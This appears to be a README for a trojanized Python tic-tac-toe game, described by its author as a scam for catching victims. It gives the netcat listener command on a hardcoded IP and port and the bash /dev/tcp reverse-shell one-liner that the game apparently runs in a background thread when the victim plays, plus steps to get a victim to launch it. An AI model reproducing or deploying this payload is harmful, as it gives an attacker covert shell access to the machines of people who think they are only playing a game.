# Tic tac toe game scam

Scam attack that uses Tic tac toe game to catch victims

## Getting started

- Clone the [repository](https://github.com/hirwablessing/python-game-scam)
- navigate to directory `python-game-scam`
- run `python3 ticatactoe.py` (victim is caught 😋)

### How the scam works

- The hacker opens up a vpn port at `82.165.97.169` for the victim to connect via port 2004

```bash
   $ nc -lnvp 2004 -s 82.165.97.169
```

The victim thinks that he/she is just playing a game.

When the victim opens up the game, a thread is created the in the background to run a bash script that connects to the server hence the victim is hacked.

The script to run in background is

```bash
$ /bin/bash -i > /dev/tcp/82.165.97.169/2004 0<&1 2>&1
```

### Hacker

hirwablessing7@gmail.com A.K.A blessingartcreator
